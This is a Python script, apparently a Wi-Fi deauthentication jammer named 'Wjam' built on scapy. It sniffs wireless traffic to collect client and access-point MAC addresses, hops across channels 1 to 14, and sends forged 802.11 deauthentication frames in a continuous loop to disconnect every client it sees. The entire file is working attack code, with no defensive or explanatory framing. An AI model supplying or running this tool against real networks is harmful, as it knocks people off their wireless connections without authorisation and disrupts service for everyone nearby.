#!/usr/bin/env python3
from scapy.all import Dot11Beacon, Dot11, RadioTap, Dot11Deauth, Packet, sniff, sendp
import os
import time
from dataclasses import dataclass
from threading import Thread
from termcolor import colored

@dataclass
class ClientData():
    src_addr:str
    ap_addr:str
    channel:str

    @property
    def data(self):
        return list(self.__dict__.values())

class Wjam():
    def __init__(self, args:dict) -> None:
        self.channel = args["channel"]
        self.shouldChange = self.channel == -1
        self.__dict__.update(args)
        self.clients:list[ClientData] = []
        self.flag = False

    def channelHooper(self):
        if not self.shouldChange:
            os.system(f"iwconfig {self.iface} channel {self.channel}")
            return
        else:
            self.channel = 1
            while not self.flag:
                os.system(f"iwconfig {self.iface} channel {self.channel}")
                self.channel = self.channel % 14 + 1
                time.sleep(0.5)

    def callback(self, packet:Packet):
        if packet.haslayer(Dot11) and not packet.haslayer(Dot11Beacon):
            if packet.type in [1, 2]:
                cd = ClientData(packet.addr1, str(packet.addr2), self.channel)
                if cd.src_addr == "ff:ff:ff:ff:ff:ff":
                    return
                if not cd in self.clients:
                    self.clients.append(cd)


    def _deauth(self, cd:ClientData):
        if cd.channel == self.channel:
            frame = RadioTap()/Dot11(addr1=str(cd.src_addr), addr2=str(cd.ap_addr), addr3=str(cd.ap_addr))/Dot11Deauth()
            try:
                sendp(frame, iface=self.iface, verbose=False)
            except:
                pass

    def deauther(self):
        while not self.flag:
            for cd in self.clients:
                ch = colored(f"{self.channel:02}", "cyan")
                srcAddr = colored(cd.src_addr, "yellow")
                tilda = colored("~", "green")
                print(f"[{tilda}] deauthing {srcAddr:013} on channel {ch}...\r", end="")
                self._deauth(cd)

    def start(self):
        if self.channel == -1:
            print("["+colored("*", "green")+"] Channel hooping is on by default.")
        else:
            print("["+colored("*", "green")+f"] Channel => {self.channel}")

        print("["+colored("+", "green")+"] Running...")
        channelHooper = Thread(target=self.channelHooper)
        channelHooper.daemon = True
        channelHooper.start()
        deauther = Thread(target=self.deauther)
        deauther.daemon = True
        deauther.start()
        sniff(iface=self.iface, prn=self.callback)
        self.flag = True
        print("\n\n["+colored("*", "red")+"] killing 2 threads...")
        channelHooper.join()
        deauther.join()
